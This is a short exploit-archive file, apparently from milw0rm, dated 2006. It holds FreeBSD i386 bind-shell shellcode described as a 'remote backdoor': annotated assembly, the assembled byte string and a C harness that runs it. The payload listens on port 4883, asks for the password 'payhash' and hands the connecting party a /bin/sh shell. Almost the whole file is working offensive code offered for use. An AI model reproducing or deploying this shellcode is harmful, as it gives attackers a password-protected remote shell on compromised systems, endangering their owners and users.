/*
THE ZUGCODE - SMALL REMOTE 6ACKD0R
FreeBSD i386 bind shell with auth
code by MahDelin
Big thx SST [kaka, nolife, white]
Listen on the port 4883 the /bin/sh
*/

/*
void zugcode(void )
{
//socket
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("pushl    $0x01");
__asm__("pushl    $0x02");
__asm__("movl     %esp,  %ebp");
__asm__("pushl    %ebp");
__asm__("movb     $0x61, %al");
__asm__("int      $0x80");

//struct sockaddr_in
__asm__("movl     %eax,    %edi");
__asm__("xorl     %eax,    %eax");
__asm__("movb     $0x02,   9(%ebp)");
__asm__("movw     $0x1313, 10(%ebp)");
__asm__("movl     %eax,    12(%ebp)");
__asm__("leal     8(%ebp), %ecx");

//bind
__asm__("xor      %ebx,%ebx");
__asm__("movb     $0x10,%bl");
__asm__("push     %ebx");
__asm__("push     %ecx");
__asm__("push     %edi");
__asm__("push     %eax");
__asm__("movb     $0x68, %al");
__asm__("int      $0x80");

//listen
__asm__("xor      %eax, %eax");
__asm__("pushl    %eax");
__asm__("pushl    $0x01");
__asm__("pushl    %edi");
__asm__("pushl    %eax");
__asm__("movb     $0x6a, %al");
__asm__("int      $0x80");

//accept
__asm__("xor      %eax, %eax");
__asm__("push     %ebx");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("pushl    %edi");
__asm__("pushl    %eax");
__asm__("movb     $0x1e, %al");
__asm__("int      $0x80");

__asm__("mov      %eax, %esi");
__asm__("xor       %eax, %eax");
__asm__("pushl     $0x203a7465");
__asm__("pushl     $0x72636573");
__asm__("movl      %esp, %ebx");
__asm__("push      %eax");
__asm__("push      $0x8");
__asm__("pushl     %ebx");
__asm__("push      %esi");
__asm__("xor       %eax, %eax");
__asm__("push      %eax");
__asm__("movb     $0x65, %al");
__asm__("int      $0x80");

//rcev password
__asm__("xor      %eax, %eax");
__asm__("pushl    %ebp");
__asm__("movl     %esp, %ebp");
__asm__("movb     $0x20, %al");
__asm__("subl     %eax,  %esp");
__asm__("xor      %eax, %eax");
__asm__("push     %eax");
__asm__("mov      $0x80, %al");
__asm__("push     %eax");
__asm__("xor      %eax, %eax");
__asm__("push     %ebp");
__asm__("push     %esi");
__asm__("push     %eax");
__asm__("movb     $0x66, %al");
__asm__("int      $0x80");

//compare password
//save registers %esi, %edi
__asm__("mov     %edi, %ebx");
__asm__("mov     %esi, %edx");
__asm__("mov     %eax, %ecx");
__asm__(".word    0x50eb");
__asm__("pop      %esi");
__asm__("mov      %ebp,     %edi");
__asm__("repe    cmpsb");
__asm__(".word    0x4275");
__asm__("mov     %ebx, %edi");
__asm__("mov     %edx, %esi");

//dup2 stdin
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

//dup2 stdout
__asm__("xorl     %eax,  %eax");
__asm__("inc      %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

//dup2 stderr
__asm__("xorl     %eax,  %eax");
__asm__("add      $0x2,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

// /bin/sh
__asm__("xor      %ecx, %ecx");
__asm__("pushl    %ecx");
__asm__("pushl    $0x68732f2f");
__asm__("pushl    $0x6e69622f");
__asm__("movl     %esp, %ebx");
__asm__("pushl    %ecx");
__asm__("pushl    %ebx");
__asm__("movl     %esp, %edx");
__asm__("pushl    %ecx");
__asm__("pushl    %edx");
__asm__("pushl    %ebx");
__asm__("pushl    %ecx");
__asm__("movb     $0x3b, %al");
__asm__("int      $0x80");

//exit
__asm__("xorl     %eax,  %eax");
__asm__("inc      %eax");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("int      $0x80");

__asm__(".byte  0xe8");
__asm__(".long  0xffffffab");
__asm__(".asciz \"payhash\12\"");
}
*/

unsigned char zug[] =
"\x31\xc0\x50\x50\x6a\x01\x6a\x02\x89\xe5\x55\xb0\x61\xcd\x80\x89\xc7\x31"
"\xc0\xc6\x45\x09\x02\x66\xc7\x45\x0a\x13\x13\x89\x45\x0c\x8d\x4d\x08\x31"
"\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80\x31\xc0\x50\x6a\x01\x57\x50"
"\xb0\x6a\xcd\x80\x31\xc0\x53\x50\x50\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31"
"\xc0\x68\x65\x74\x3a\x20\x68\x73\x65\x63\x72\x89\xe3\x50\x6a\x08\x53\x56"
"\x31\xc0\x50\xb0\x65\xcd\x80\x31\xc0\x55\x89\xe5\xb0\x20\x29\xc4\x31\xc0"
"\x50\xb0\x80\x50\x31\xc0\x55\x56\x50\xb0\x66\xcd\x80\x89\xfb\x89\xf2\x89"
"\xc1\xeb\x50\x5e\x89\xef\xf3\xa6\x75\x42\x89\xdf\x89\xd6\x31\xc0\x50\x56"
"\x50\xb0\x5a\xcd\x80\x31\xc0\x40\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31"
"\xc0\x83\xc0\x02\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31\xc9\x51\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe2\x51\x52\x53\x51"
"\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80\xe8\xab\xff\xff\xff\x70\x61"
"\x79\x68\x61\x73\x68\x0a";

main()
{
int (*zugcode)();
printf("shellcode len, %d bytes\n", strlen(zug));
zugcode = (int (*)()) zug;
(int)(*zugcode)();
}

// milw0rm.com [2006-07-19]